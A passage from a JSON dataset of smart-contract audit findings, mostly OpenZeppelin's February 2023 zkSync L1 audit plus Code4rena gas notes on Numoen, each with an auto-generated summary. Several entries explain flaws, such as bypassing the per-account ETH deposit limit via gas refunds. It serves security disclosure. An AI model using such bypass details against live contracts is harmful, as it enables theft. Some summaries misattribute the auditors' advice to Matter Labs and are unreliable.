      "content": "There are very few tests for most functionalities.\n\n\nFor example, `Mailbox.sol` (particularly `MailboxFacet`) is a key contract for the L1 bridge, and has 360+ lines of code and a large dependency tree of aggregated thousands of lines of non-library solidity code (specific to this codebase). The code implements sensitive functionality with many important details and execution branches. However, there are only four basic tests in [`mailbox_test.ts`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/test/unit_tests/mailbox_test.ts):\n\n\n* One test for non-reverting execution of an expected valid input. This tests nothing about the successful execution results.\n* Three more tests that check reverts in `L2ContractsHelper` contract.\n\n\nThis means that the entirety of the `MailboxFacet` functionality is untested in this repository.\n\n\nFurthermore, as some system-level integration tests exist in [another repository](https://github.com/matter-labs/zksync-2-dev/tree/main/core/tests/ts-integration), there too, most of the functionality of the Mailbox remains untested:\n\n\n* There are no invocations for the `finalizeEthWithdrawal` mutative method, or the views `proveL2LogInclusion`, `proveL1ToL2TransactionStatus`, and `serializeL2Transaction`.\n* There is a [single file](https://github.com/matter-labs/zksync-2-dev/blob/bda06e7ea727f4fbe840071aa81320aa5c50600b/core/tests/ts-integration/tests/l1.test.ts) for L1 functionality that invokes the main `requestL2Transaction` method. This test file totals around 300 lines of testing code, for which the majority of tests only assert either a revert or a lack of revert.\n\n\nThis leads to several potential issues:\n\n\n* The correctness of the code can only be assessed based on partial, and changing documentation. This is because intended and unintended behavior is not captured in tests.\n* Introduction of new vulnerabilities for established code in future code changes, since known positive and negative behaviors are not checked automatically.\n* Higher likelihood of missed vulnerabilities in current and future development and review.\n\n\nConsider adding contract-level testing to test all branches of execution. Additionally, consider implementing an ongoing measurement of testing coverage as a way to ensure at least 95% coverage.\n\n\n***Update:** Partially resolved in [pull request #36](https://github.com/matter-labs/zksync-2-contracts/pull/36), [pull request #42](https://github.com/matter-labs/zksync-2-contracts/pull/42), [pull request #43](https://github.com/matter-labs/zksync-2-contracts/pull/43), [pull request #45](https://github.com/matter-labs/zksync-2-contracts/pull/45), [pull request #46](https://github.com/matter-labs/zksync-2-contracts/pull/46), [pull request #48](https://github.com/matter-labs/zksync-2-contracts/pull/48) and [pull request #51](https://github.com/matter-labs/zksync-2-contracts/pull/51). The Matter Labs team stated:*\n\n\n\n> *We are working on improving the test coverage over the entire codebase.*\n> \n>",
      "summary": "\nThis bug report is about the lack of tests for a key contract, `Mailbox.sol`, which has 360+ lines of code and a large dependency tree of aggregated thousands of lines of non-library solidity code. There are only four basic tests in `mailbox_test.ts`, one of which tests nothing about the successful execution results, and the other three check reverts in `L2ContractsHelper` contract. Furthermore, in another repository, there are system-level integration tests, but most of the functionality of the Mailbox remains untested. This leads to potential issues such as correctness of the code can only be assessed based on partial, and changing documentation, introduction of new vulnerabilities for established code in future code changes, and higher likelihood of missed vulnerabilities in current and future development and review.\n\nTo resolve this issue, the Matter Labs team is working on improving the test coverage over the entire codebase. Consider adding contract-level testing to test all branches of execution and implementing an ongoing measurement of testing coverage as a way to ensure at least 95% coverage.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10313",
      "title": "Block overhead limits may be exceeded",
      "impact": "MEDIUM",
      "content": "In `_getOverheadForTransaction` some overhead values can go over their maximum values if the transaction data or the public data posted (e.g., state changes) are large:\n\n\n* [`_encodingLength`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L503) can take more memory than allowed by the `BOOTLOADER_TX_ENCODING_SPACE`.\n* [`overheadForPublicData`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L509) for the transaction can be larger than the `MAX_PUBDATA_PER_BLOCK` constant.\n* [`overheadForComputation`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L519) can be larger than the `L2_TX_MAX_GAS_LIMIT`.\n\n\nExceeding these values may violate invariants that are important for accurate L2 gas metering.\n\n\nConsider checking that the encoded transaction length is in the expected range to prevent going over the maximum expected values. Additionally, consider checking that at no point the resulting calculated overhead is larger than the maximum overhead.\n\n\n***Update:** Partially resolved in [pull request #34](https://github.com/matter-labs/zksync-2-contracts/pull/34) at commit [19c7b81](https://github.com/matter-labs/zksync-2-contracts/pull/34/commits/19c7b81fb521ebbf639d68b6fd4eafbcc0503989). The Matter Labs team stated:*\n\n\n\n> *Acknowledged. We temporarily removed the block overhead, but a fix will be applied when restoring it.*\n> \n>",
      "summary": "\nThis bug report is about the `_getOverheadForTransaction` function in the `zksync` contracts repository. This function can cause overhead values to exceed their maximum values if the transaction data or public data posted (e.g., state changes) are large. In particular, the `_encodingLength` can take more memory than allowed by the `BOOTLOADER_TX_ENCODING_SPACE`, the `overheadForPublicData` for the transaction can be larger than the `MAX_PUBDATA_PER_BLOCK` constant, and the `overheadForComputation` can be larger than the `L2_TX_MAX_GAS_LIMIT`. Exceeding these values may violate invariants that are important for accurate L2 gas metering.\n\nTo fix this, the Matter Labs team suggests considering checking that the encoded transaction length is in the expected range to prevent exceeding the maximum expected values. Additionally, they suggest considering checking that at no point the resulting calculated overhead is larger than the maximum overhead. The team has partially resolved this issue in pull request #34 at commit 19c7b81, and they plan to apply a fix when restoring the block overhead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10312",
      "title": "User could deposit more ETH than allowed",
      "impact": "MEDIUM",
      "content": "zkSync has implemented a limit on the amount of ETH that can be deposited to L2 per account. However, the code currently has a design flaw that allows users to bypass this limit by exploiting a gas refund scheme. Specifically, in the `requestL2Transaction` function, the deposited ETH amount is verified using the [`_l2Value`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L247) parameter, while the `valueToMint` parameter is [set to `msg.value`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L300) when composing a priority queue transaction.\n\n\nThis means that a user can mint ETH without triggering the limit by setting `_l2Value = 0` and using the gas refund when requesting any L2 transactions. Furthermore, even if `msg.value` was set as the limit amount, the user could run into issues when trying to request L2 transactions from L1 after reaching their limit.\n\n\nTo mitigate this issue, a system design change is needed around L2 gas refunding or ETH bridging limits. However, the specifics of the solution will depend on the overall design and goals of the system. Careful consideration and testing will be needed to ensure that the solution effectively mitigates this issue while also preserving the intended functionality of the system.\n\n\n***Update:** Resolved in [pull request #32](https://github.com/matter-labs/zksync-2-contracts/pull/32) at commit [201c99c](https://github.com/matter-labs/zksync-2-contracts/pull/32/commits/201c99c117049813663b9ec9fc78f2cf52168a4b).`msg.value` is now used to verify the deposited ETH amount, however as we pointed out above, this design choice could mean users might not be able to request L2 transactions after reaching their limit.*",
      "summary": "\nzkSync is a platform that allows users to deposit ETH to L2, however there is a design flaw which allows users to bypass the deposit limit. Specifically, when requesting a L2 transaction, the deposited ETH amount is verified using the `_l2Value` parameter, while the `valueToMint` parameter is set to `msg.value`. This means that the user can mint ETH without triggering the limit by setting `_l2Value = 0` and using the gas refund when requesting any L2 transactions. \n\nTo resolve this issue, a system design change is needed around L2 gas refunding or ETH bridging limits. This change should effectively mitigate the issue while preserving the intended functionality of the system. The issue has since been resolved in pull request #32 at commit 201c99c, where `msg.value` is now used to verify the deposited ETH amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10311",
      "title": "Unchecked subtraction underflow",
      "impact": "MEDIUM",
      "content": "L2 gas validation performs [an unchecked subtraction](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L543), and a neighboring comment states that the underflow prevention is enforced by the implementation of the preceding computation. However, the preceding computation takes a large variety of constants and variable parameters, which depending on their values can still cause an underflow.\n\n\nFor example, the calculation of the memory overhead can result in arbitrarily large values depending on the value passed in `_encodingLength` and the constant `BOOTLOADER_TX_ENCODING_SPACE`, since both values’ ranges are not validated.\n\n\nNote that it is likely that there are additional ways by which the combination of different possible values of constants and inputs could cause the resulting overhead to be higher than the total gas limit.\n\n\nThis may result in an underflow of the unchecked subtraction. In turn, it will likely cause a revert due to subsequent [`l2GasForTxBody`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L346-L348) checks.\n\n\nConsider not using the `unchecked` subtraction to prevent the underflow, and adding an explicit check to validate the overhead.\n\n\n***Update:** Resolved in [pull request #54](https://github.com/matter-labs/zksync-2-contracts/pull/54) at commit [94bc1a6](https://github.com/matter-labs/zksync-2-contracts/pull/54/commits/94bc1a679cd55afb0929c33ff47d27911ab55a6f).*",
      "summary": "\nThis bug report is about a potential underflow issue in the L2 gas validation process. The underflow is caused by the lack of validation of constants and variable parameters, which can result in arbitrarily large values depending on the value passed in. This in turn can cause an unchecked subtraction to result in an underflow and a subsequent revert due to the l2GasForTxBody checks. To prevent this, the unchecked subtraction should be avoided and an explicit check should be added to validate the overhead. The issue was resolved in pull request #54 at commit 94bc1a6.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10310",
      "title": "Formula and documentation mismatch",
      "impact": "MEDIUM",
      "content": "The [formula for `overheadForPublicData`](https://www.notion.so/matterlabs/zkSync-fee-model-8e6c9196f4f84105a958a0e2463c3b39?pvs=4#0fc2b9fcb5f24acc90f926f78df90bd3) uses `Tm` which is defined [as the maximal transaction ergs limit here](https://www.notion.so/matterlabs/zkSync-fee-model-8e6c9196f4f84105a958a0e2463c3b39?pvs=4#1e9678ff8c0e46f291130cb52c3f7867).\n\n\nThis appears to correspond in code to `L2_TX_MAX_GAS_LIMIT`:\n\n\n\n> /// @dev The maximum number of L2 gas that a user can request for an L2 transaction\n> \n> \n\n\nHowever, the calculation in code [uses the `MAX_PUBDATA_PER_BLOCK`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L509) constant instead, which refers to:\n\n\n\n> */// @dev The maximum number of the pubdata an L2 operation should be allowed to use.*\n> \n> \n\n\nThis corresponds [to `Pm`](https://www.notion.so/matterlabs/zkSync-fee-model-8e6c9196f4f84105a958a0e2463c3b39?pvs=4#0389150f6da2408ebdeda7c8b5c53598) in the documentation.\n\n\nThese appear to be different quantities, measured in different units, of different magnitudes (`80000000` vs `110000`). As a result, a denial of service may occur if the overhead is calculated incorrectly (underestimated), which will result in `l2GasForTxBody` being overestimated, and possibly [reverting in `_writePriorityOp`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L346-L348) despite having legitimate values passed as inputs.\n\n\nAlternatively, as the overhead is underestimated, a larger-than-limit `l2GasForTxBody` may be submitted, which will cause failures on L2.\n\n\nConsider adding test cases to the documentation with concrete example values, and implementing these test cases in the codebase test suite to ensure basic compatibility. Additionally, consider documenting in code both the correspondence of the constants to the documentation’s notation, and the derivation and logic of the formulas implemented in comments in the same file, so that access to external documentation would not prevent the reader from reviewing the code.\n\n\n***Update:** Partially resolved in [pull request #34](https://github.com/matter-labs/zksync-2-contracts/pull/34) at commit [19c7b81](https://github.com/matter-labs/zksync-2-contracts/pull/34/commits/19c7b81fb521ebbf639d68b6fd4eafbcc0503989). The Matter Labs team stated:*\n\n\n\n> *Acknowledged. For now, we have decided to temporarily remove the overhead. The issue will be fixed once we introduce the block overhead back to our users.*\n> \n>",
      "summary": "\nThis bug report is about the formula for `overheadForPublicData` used in the zkSync fee model. The formula uses `Tm` which is defined as the maximal transaction ergs limit. In the code, it uses the `MAX_PUBDATA_PER_BLOCK` constant instead, which refers to the maximum number of pubdata an L2 operation should be allowed to use. These two quantities are different and measured in different units, which could cause a denial of service if the overhead is calculated incorrectly. To prevent this, test cases should be added to the documentation with concrete example values and implemented in the codebase test suite. Additionally, the correspondence of the constants to the documentation’s notation and the derivation and logic of the formulas should be documented. This issue has been partially resolved with the removal of the overhead in a pull request, and it will be fixed once the block overhead is reintroduced.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10309",
      "title": "Refund recipient defaults to inaccessible address for contracts",
      "impact": "MEDIUM",
      "content": "In [`_requestL2Transaction`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L301), if `address(0)` is specified as the refund recipient, `msg.sender` is used by default. However, the `msg.sender` address will not be controllable by contracts on L2, so any refund, or the bridged ETH amount in case of a failed transaction, will be lost.\n\n\nConsider disallowing unspecified refund recipients for any ETH transfers, or reverting in the case of an unspecified recipient if the sender is not an EOA.\n\n\n***Update:** Resolved in [pull request #32](https://github.com/matter-labs/zksync-2-contracts/pull/32) at commit [201c99c](https://github.com/matter-labs/zksync-2-contracts/pull/32/commits/201c99c117049813663b9ec9fc78f2cf52168a4b).*",
      "summary": "\nA bug was discovered in the `_requestL2Transaction` function of the zksync-2-contracts repository on GitHub. If `address(0)` was specified as the refund recipient, `msg.sender` was used by default. This means that any refund, or the bridged ETH amount in case of a failed transaction, would be lost as `msg.sender` cannot be controlled by contracts on Layer 2.\n\nThe bug was resolved in pull request #32 at commit 201c99c117049813663b9ec9fc78f2cf52168a4b. The solution was to disallow unspecified refund recipients for any ETH transfers, or to revert in the case of an unspecified recipient if the sender is not an EOA (Externally Owned Account).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10308",
      "title": "ETH withdrawal within allowed limit could fail",
      "impact": "HIGH",
      "content": "The protocol enforces an ETH withdraw limit (currently 10% of the total balance) within each 1-day window as a safety mechanism. This is done through the [`_verifyWithdrawalLimit` function in `Mailbox.sol`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L204). However, this function has a logic flaw that could cause an ETH withdrawal within the limit to fail.\n\n\nWhen withdrawal validations occur within the same 1-day window, the function checks the limit in [line 215 of Mailbox](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L215), as follows:\n\n\n\n\n```\n require(\n                _amount + s.withdrawnAmountInWindow <= (limitData.withdrawalFactor * address(this).balance) / 100, \n                \"w4\"\n            );\n\n```\n\n\nHowever, `address(this).balance` has already changed due to the previous withdrawal within the same day, causing the allowance to be less than the allowed 10%. This could cause any planned withdrawal to fail due to previous withdrawals. Note that a similar issue could also exist in the ERC-20 bridge .\n\n\nConsider recording `address(this).balance` when updating `s.lastWithdrawalLimitReset`, and using it as the base when calculating the daily withdraw limit.\n\n\n***Update:** Resolved in [pull request #60](https://github.com/matter-labs/zksync-2-contracts/pull/60) at commit [6365a8b](https://github.com/matter-labs/zksync-2-contracts/pull/60/commits/6365a8bbe412ff0a526905d4d87e78da5cb072e8). The Matter Labs team decided to completely remove the withdrawal limitation.*",
      "summary": "\nA bug was discovered in the protocol of the Zksync-2-contracts project which could cause ETH withdrawals within the limit to fail. The bug was in the `_verifyWithdrawalLimit` function in `Mailbox.sol`. The function checks the limit in line 215, however, the `address(this).balance` has already changed due to a previous withdrawal within the same day, causing the allowance to be less than the allowed 10%. This could cause any planned withdrawal to fail due to previous withdrawals. A similar issue could also exist in the ERC-20 bridge. The Matter Labs team decided to remove the withdrawal limitation and the bug was resolved in pull request #60 at commit 6365a8bbe412ff0a526905d4d87e78da5cb072e8.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10307",
      "title": "Deposit cap not updated on withdrawals",
      "impact": "HIGH",
      "content": "User deposits are capped by [increasing the `totalDepositedAmountPerUser`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L266) counter. However, the counter is not decreased by withdrawals.\n\n\nAs the counter can only be increased, after sufficient usage, all withdrawing users will be locked out of depositing again. This can possibly happen right after the first deposit and withdrawal, if the initial amount is larger than half the cap.\n\n\nConsider decreasing the per-user cap during withdrawals to allow users to return to the rollup.\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *The deposit limitations are only enabled in Fair Onboarding Alpha, while only approved partners may deposit funds. This will be removed at Full Launch Alpha, so we treat this issue as an accepted risk.*\n> \n>",
      "summary": "\nThis bug report is about a problem with user deposits being capped by an increasing counter, but the counter not being decreased by withdrawals. This can lead to users being locked out of depositing again after making their first deposit and withdrawal, if the initial amount is larger than half the cap. The suggested solution is to decrease the per-user cap during withdrawals to allow users to return to the rollup. The Matter Labs team acknowledged the issue but stated that it is an accepted risk until the Full Launch Alpha, when the deposit limitations will be removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "43342",
      "title": "[G-08]  `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-=` too)",
      "impact": "GAS",
      "content": "Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**. Subtractions act the same way.\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: src\\core\\Lendgine.sol\n\n91      totalLiquidityBorrowed += liquidity;\n\n114     totalLiquidityBorrowed -= liquidity;\n\n176     totalPositionSize -= size;\n\n257     rewardPerPositionStored += FullMath.mulDiv(dilutionSpeculative, 1e18, totalPositionSize);\n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43341",
      "title": "[G-07]  Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.\n\n*There are 18 instances of this issue:*\n\n```solidity\nFile: src\\core\\ImmutableState.sol\n\n/// @audit parameters()\n33      (token0, token1, _token0Exp, _token1Exp, upperBound) = Factory(msg.sender).parameters();\n```\n\n```solidity\nFile: src\\periphery\\LendgineRouter.sol\n\n/// @audit mint()\n147     shares = ILendgine(lendgine).mint(\n148       address(this),\n149       params.amountIn + params.amountBorrow,\n150       abi.encode(\n151         MintCallbackData({\n152           token0: params.token0,\n153           token1: params.token1,\n154           token0Exp: params.token0Exp,\n155           token1Exp: params.token1Exp,\n156           upperBound: params.upperBound,\n157           collateralMax: params.amountIn,\n158           swapType: params.swapType,\n159           swapExtraData: params.swapExtraData,\n160           payer: msg.sender\n161         })\n162       )\n163     );\n\n/// @audit reserve0()\n198     uint256 r0 = ILendgine(msg.sender).reserve0();\n\n/// @audit reserve1()\n199     uint256 r1 = ILendgine(msg.sender).reserve1();\n\n/// @audit totalLiquidity()\n200     uint256 totalLiquidity = ILendgine(msg.sender).totalLiquidity();\n\n/// @audit convertLiquidityToCollateral()\n231     uint256 collateralTotal = ILendgine(msg.sender).convertLiquidityToCollateral(liquidity);\n\n/// @audit burn()\n266     amount = ILendgine(lendgine).burn(\n267       address(this),\n268       abi.encode(\n269         PairMintCallbackData({\n270           token0: params.token0,\n271           token1: params.token1,\n272           token0Exp: params.token0Exp,\n273           token1Exp: params.token1Exp,\n274           upperBound: params.upperBound,\n275           collateralMin: params.collateralMin,\n276           amount0Min: params.amount0Min,\n277           amount1Min: params.amount1Min,\n278           swapType: params.swapType,\n279           swapExtraData: params.swapExtraData,\n280           recipient: recipient\n281         })\n282       )\n283     );\n```\n\n```solidity\nFile: src\\periphery\\LiquidityManager.sol\n\n/// @audit reserve0()\n140     uint256 r0 = ILendgine(lendgine).reserve0();\n\n/// @audit reserve1()\n141     uint256 r1 = ILendgine(lendgine).reserve1();\n\n/// @audit totalLiquidity()\n142     uint256 totalLiquidity = ILendgine(lendgine).totalLiquidity();\n\n/// @audit deposit()\n157     uint256 size = ILendgine(lendgine).deposit(\n158       address(this),\n159       params.liquidity,\n160       abi.encode(\n161         PairMintCallbackData({\n162           token0: params.token0,\n163           token1: params.token1,\n164           token0Exp: params.token0Exp,\n165           token1Exp: params.token1Exp,\n166           upperBound: params.upperBound,\n167           amount0: amount0,\n168           amount1: amount1,\n169           payer: msg.sender\n170         })\n171       )\n172     );\n\n/// @audit positions()\n177     (, uint256 rewardPerPositionPaid,) = ILendgine(lendgine).positions(address(this));\n\n/// @audit withdraw()\n208     (uint256 amount0, uint256 amount1, uint256 liquidity) = ILendgine(lendgine).withdraw(recipient, params.size);\n\n/// @audit positions()\n213     (, uint256 rewardPerPositionPaid,) = ILendgine(lendgine).positions(address(this));\n\n/// @audit positions()\n237     (, uint256 rewardPerPositionPaid,) = ILendgine(params.lendgine).positions(address(this));\n\n/// @audit collect()\n246     uint256 collectAmount = ILendgine(params.lendgine).collect(recipient, amount);\n```\n\n```solidity\nFile: src\\periphery\\SwapHelper.sol\n\n/// @audit swap()\n103       (int256 amount0, int256 amount1) = pool.swap(\n104         params.recipient,\n105         zeroForOne,\n106         params.amount,\n107         zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,\n108         abi.encode(params.tokenIn)\n109       );\n```\n\n```solidity\nFile: src\\periphery\\UniswapV2\\libraries\\UniswapV2Library.sol\n\n/// @audit getReserves()\n46      (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43340",
      "title": "[G-06]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 10 instances of this issue:*\n\n```solidity\nFile: src\\core\\Factory.sol\n\n/// @audit `getLendgine[token0]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1][token0Exp]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1][token0Exp][token1Exp]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n```\n\n```solidity\nFile: src\\core\\Lendgine.sol\n\n/// @audit `totalPositionSize` on line 135\n142     if (totalLiquiditySupplied == 0 && totalPositionSize > 0) revert CompleteUtilizationError();\n\n/// @audit `totalPositionSize` on line 163\n176     totalPositionSize -= size;\n\n/// @audit `totalLiquidityBorrowed` on line 239\n247     uint256 _totalLiquidityBorrowed = totalLiquidityBorrowed; // SLOAD\n```\n\n```solidity\nFile: src\\periphery\\LiquidityManager.sol\n\n/// @audit `positions[params.recipient]` on line 175\n182     positions[params.recipient][lendgine] = position; // SSTORE\n\n/// @audit `positions[msg.sender]` on line 211\n218     positions[msg.sender][lendgine] = position; // SSTORE\n\n/// @audit `positions[msg.sender]` on line 235\n244     positions[msg.sender][params.lendgine] = position; // SSTORE\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43339",
      "title": "[G-05]  Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata.\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: src\\core\\Factory.sol\n\n/// @audit `getLendgine[token0]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1][token0Exp]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n\n/// @audit `getLendgine[token0][token1][token0Exp][token1Exp]` on line 76\n86      getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n```\n\n```solidity\nFile: src\\periphery\\LiquidityManager.sol\n\n/// @audit `positions[params.recipient]` on line 175\n182     positions[params.recipient][lendgine] = position; // SSTORE\n\n/// @audit `positions[msg.sender]` on line 211\n218     positions[msg.sender][lendgine] = position; // SSTORE\n\n/// @audit `positions[msg.sender]` on line 235\n244     positions[msg.sender][params.lendgine] = position; // SSTORE\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43338",
      "title": "[G-04]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`.\n\n*There are 10 instances of this issue:*\n\n```solidity\nFile: src\\core\\JumpRate.sol\n\n/// @audit `if`-condition on line 16\n20        uint256 excessUtil = util - kink;\n```\n\n```solidity\nFile: src\\core\\Lendgine.sol\n\n/// @audit ternary expression on line 198\n201       position.tokensOwed = tokensOwed - collateral; // SSTORE\n\n244     uint256 timeElapsed = block.timestamp - lastUpdate;\n\n/// @audit ternary expression on line 253\n256     totalLiquidityBorrowed = _totalLiquidityBorrowed - dilutionLP;\n```\n\n```solidity\nFile: src\\core\\Pair.sol\n\n/// @audit checked arithmetic on line 106\n108     reserve0 = _reserve0 - SafeCast.toUint120(amount0); // SSTORE\n\n/// @audit checked arithmetic on line 106\n109     reserve1 = _reserve1 - SafeCast.toUint120(amount1); // SSTORE\n\n/// @audit checked arithmetic on line 106\n110     totalLiquidity = _totalLiquidity - liquidity; // SSTORE\n\n/// @audit checked arithmetic on line 131\n135     reserve0 = _reserve0 + SafeCast.toUint120(amount0In) - SafeCast.toUint120(amount0Out); // SSTORE\n\n/// @audit checked arithmetic on line 131\n136     reserve1 = _reserve1 + SafeCast.toUint120(amount1In) - SafeCast.toUint120(amount1Out); // SSTORE\n```\n\n```solidity\nFile: src\\periphery\\SwapHelper.sol\n\n107         zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,\n```\n\n",
